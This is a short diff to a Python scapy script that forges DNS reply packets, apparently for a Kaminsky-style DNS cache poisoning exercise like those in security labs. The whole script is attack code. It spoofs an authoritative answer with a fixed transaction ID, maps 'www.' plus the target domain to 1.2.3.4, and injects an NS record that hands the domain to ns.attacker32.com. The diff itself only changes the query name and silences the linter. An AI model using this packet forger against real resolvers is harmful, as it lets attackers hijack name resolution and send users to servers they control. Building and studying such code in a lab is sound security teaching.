@@ -1,4 +1,5 @@
 #!/usr/bin/env python3 
+#pylint: disable-all
 
 from argparse import ArgumentParser
 from scapy.all import send, IP, UDP, DNS, DNSQR, DNSRR
@@ -18,7 +19,7 @@ def reply():
     udp = UDP(dport=3333, sport=53, chksum=0)
     dns = DNS(id=0xAAA, aa=1, rd=1, qr=1,
               qdcount=1, ancount=1, nscount=1, arcount=0,
-              qd=DNSQR(qname=name),
+              qd=DNSQR(qname='www.' + domain),
               an=DNSRR(rrname='www.' + domain, type='A', rdata='1.2.3.4', ttl=259200),
               ns=DNSRR(rrname=domain, type='NS', rdata='ns.attacker32.com', ttl=259200))
     return ip/udp/dns
